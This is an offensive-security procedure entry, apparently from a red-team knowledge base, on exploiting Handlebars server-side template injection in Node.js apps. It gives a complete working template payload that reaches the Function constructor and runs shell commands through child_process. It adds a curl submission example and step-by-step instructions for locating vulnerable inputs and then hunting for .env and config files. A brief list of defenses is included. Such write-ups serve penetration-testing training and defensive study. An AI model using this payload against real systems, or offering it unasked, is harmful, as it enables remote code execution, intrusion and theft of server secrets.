---
id: 9efafce9-2e85-4234-aa1d-f9eabd6ee4ea
name: Handlebars-Server-Side-Template-Injection-List-Files
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.253027+00:00'
updated_at: '2023-04-10T20:23:36.702275+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Handlebars]]'
  - '[[tags/Server-Side-Template-Injection]]'
  - '[[tags/Command-Execution]]'
  - ssti
  - node-js
commands: []
platforms:
  - Web
  - Node.js
tools: []
validated: true
---

# Handlebars-Server-Side-Template-Injection-List-Files

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in Handlebars, a Node.js templating engine, to achieve remote command execution and list files in the server's current directory. By injecting a malicious Handlebars template, an attacker can manipulate the template context to access Node.js globals and execute system commands via the child_process module, revealing file system details for further reconnaissance.

## Description

Handlebars is widely used in web applications for rendering dynamic HTML with embedded expressions. If user-supplied input is directly interpolated into templates without sanitization, attackers can inject arbitrary Handlebars expressions. This procedure leverages prototype pollution and constructor access within the template engine to construct a JavaScript function that executes shell commands on the server. Specifically, it targets the current working directory to list files with details like permissions and sizes using 'ls -la'. This technique is applicable in scenarios where an application reflects user input in a Handlebars-rendered page, such as search fields, user profiles, or comment sections. Success depends on the application's configuration allowing access to Node.js built-ins. The output provides insights into the server's file structure, aiding in identifying configuration files, logs, or paths for further exploitation.

## Requirements

1. Access to a web application using Handlebars for templating where user input is reflected without escaping.
2. Ability to submit input via a form, URL parameter, or API endpoint that gets processed by Handlebars.
3. A proxy tool like Burp Suite to intercept and modify requests if needed.
4. Knowledge of the target application's input points and basic Node.js environment assumptions (Unix-like OS for 'ls' command).

## Defense

- Sanitize and escape all user inputs before passing them to Handlebars templates using built-in helpers or libraries like handlebars-sanitize.
- Disable access to Node.js globals and constructors by configuring Handlebars with a restricted context or using a sandboxed environment.
- Implement Content Security Policy (CSP) and Web Application Firewall (WAF) rules to detect anomalous template expressions.
- Regularly audit template usage and avoid dynamic interpolation of user data; use predefined helpers instead.
- Monitor server logs for unexpected child_process executions or file system accesses.

## Objectives

1. Inject a malicious Handlebars template to achieve code execution on the server.
2. Execute a command to list files in the current directory, revealing file system structure.
3. Gather reconnaissance data for potential lateral movement or further exploitation.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate an input field or parameter in the application that is reflected into a Handlebars template without proper escaping. This could be a search box, username field, or custom template input. Test for SSTI by injecting a simple expression like '{{7*7}}' and checking if the output renders as '49' instead of literal text.

> If the expression evaluates, the endpoint is vulnerable to injection. Use a proxy to capture the request and confirm the input reaches the template engine.

### Step 2: Craft and Inject the Malicious Payload

**Context**: Construct the Handlebars payload to pollute the prototype chain, access the string constructor, and build a function that requires the child_process module to execute 'ls -la'. Submit this payload via the identified input point to trigger execution during template rendering.

**Code** ([[codes/Handlebars-SSTI-List-Files-Payload]]):

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> This payload manipulates the template's context to create and invoke a function that runs the 'ls -la' command synchronously, outputting the directory listing directly into the rendered page.

### Step 3: Submit the Payload and Capture Output

**Context**: Send the crafted payload through the vulnerable input (e.g., via POST request or URL parameter). Intercept the response to extract the command output embedded in the HTML. If the application suppresses errors, variations may be needed to bypass filters.

> Use tools like curl or a browser to submit: `curl -X POST -d "input={{#with ...}}" https://target.com/vulnerable-endpoint`. Verify the response contains file listing details rather than errors.

### Step 4: Verify and Analyze Results

**Context**: Parse the response for the command output, which should include file names, permissions, owners, sizes, and timestamps. If no output appears, check for sandboxing or adjust the payload (e.g., change 'ls -la' to 'dir' for Windows).

> Successful execution indicates full RCE; use this data to identify sensitive files like config.json or .env for next steps.
